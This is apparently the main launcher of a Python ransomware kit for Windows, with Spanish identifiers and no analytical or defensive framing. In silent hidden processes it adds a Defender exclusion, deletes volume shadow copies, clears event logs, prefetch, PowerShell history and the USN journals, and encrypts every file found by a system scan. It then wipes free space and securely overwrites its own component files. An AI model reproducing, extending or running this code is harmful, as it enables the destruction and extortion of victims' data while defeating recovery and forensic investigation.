import os
import sys
import time
import threading
import shutil
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

if getattr(sys, 'frozen', False):
    SCRIPT_DIR = os.path.dirname(sys.executable)
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

os.chdir(SCRIPT_DIR)


def verificar_e_instalar_dependencias():
    try:
        import cryptography
        import psutil
        return True
    except ImportError:
        pass
    
    python_exe = os.path.join(SCRIPT_DIR, 'python_portable', 'python.exe')
    if not os.path.exists(python_exe):
        python_exe = sys.executable
    
    try:
        pip_packages = ['cryptography', 'psutil']
        for pkg in pip_packages:
            subprocess.run([
                python_exe, '-m', 'pip', 'install', pkg, '--quiet',
                '--trusted-host', 'pypi.org',
                '--trusted-host', 'files.pythonhosted.org'
            ], capture_output=True, creationflags=0x08000000, timeout=180)
        
        import cryptography
        import psutil
        return True
    except:
        return False


def add_exclusion():
    try:
        script_dir = os.path.abspath(os.getcwd())
        ps_cmd = f'Add-MpPreference -ExclusionPath "{script_dir}"'
        subprocess.Popen(['powershell', '-w', 'h', '-c', ps_cmd], creationflags=0x08000000)
        time.sleep(2)
    except:
        pass


def pre_cleanup():
    try:
        subprocess.Popen(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], creationflags=0x08000000)
        subprocess.Popen(['wmic', 'shadowcopy', 'delete'], creationflags=0x08000000)
        subprocess.Popen(['powercfg', '-h', 'off'], creationflags=0x08000000)
        subprocess.Popen([
            'reg', 'add',
            r'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management',
            '/v', 'ClearPageFileAtShutdown',
            '/t', 'REG_DWORD',
            '/d', '1',
            '/f'
        ], creationflags=0x08000000)
        subprocess.Popen(['powershell', '-w', 'h', '-nop', '-c', 'Remove-Item C:\\Windows\\Prefetch\\*.pf -Force'], creationflags=0x08000000)
        subprocess.Popen(['wevtutil', 'cl', 'Application'], creationflags=0x08000000)
        subprocess.Popen(['wevtutil', 'cl', 'System'], creationflags=0x08000000)
        subprocess.Popen(['wevtutil', 'cl', 'Security'], creationflags=0x08000000)
        ps_history = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
        if os.path.exists(ps_history):
            open(ps_history, 'w').close()
        for drive in ['C:', 'D:', 'E:', 'F:']:
            if os.path.exists(drive):
                subprocess.Popen(['fsutil', 'usn', 'deletejournal', '/D', drive], creationflags=0x08000000)
        subprocess.Popen(['reg', 'delete', r'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache', '/f'], creationflags=0x08000000)
        import ctypes
        ctypes.windll.psapi.EmptyWorkingSet(-1)
    except:
        pass


def auto_destruir_archivos():
    archivos = ['evasion_av.py', 'rutas.py', 'encriptador_12_capas.py', 'launcher.py', 'launcher.bat', 'launcher.sh']
    for f in archivos:
        if os.path.exists(f):
            try:
                size = os.path.getsize(f)
                if size == 0:
                    os.remove(f)
                    continue
                for pattern in [b'\\x00', b'\\xFF']:
                    with open(f, 'wb') as fw:
                        fw.write(pattern * size)
                        fw.flush()
                        os.fsync(fw.fileno())
                os.remove(f)
            except:
                try:
                    os.remove(f)
                except:
                    pass


def cleanup_python_thread():
    time.sleep(300)
    try:
        if os.path.exists('python_portable'):
            shutil.rmtree('python_portable')
    except:
        pass


def wipe_memory_aggressive():
    try:
        import gc
        for _ in range(10):
            gc.collect()
    except:
        pass


try:
    from evasion_av import verificar_seguridad_total
except:
    verificar_seguridad_total = lambda: True

try:
    from rutas import escanear_sistema
    from encriptador_12_capas import EncriptadorMilitar
except ImportError:
    sys.exit(1)


def encriptar_archivo(enc, ruta):
    try:
        result = enc.encriptar(ruta)
        if result:
            try:
                dirname = os.path.dirname(ruta)
                subprocess.Popen(['cipher', '/w:' + dirname], creationflags=0x08000000)
            except:
                pass
        return result
    except:
        return False


def main():
    try:
        add_exclusion()
        
        if not verificar_e_instalar_dependencias():
            sys.exit(1)
        
        pre_cleanup()
        threading.Thread(target=cleanup_python_thread, daemon=True).start()
        os.chdir(SCRIPT_DIR)
        archivos, _, _ = escanear_sistema()
        enc = EncriptadorMilitar()
        auto_destruir_archivos()
        NUM_THREADS = 2
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = {executor.submit(encriptar_archivo, enc, ruta): ruta for ruta in archivos}
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        wipe_memory_aggressive()
        pre_cleanup()
    except:
        pass


if __name__ == "__main__":
    main()
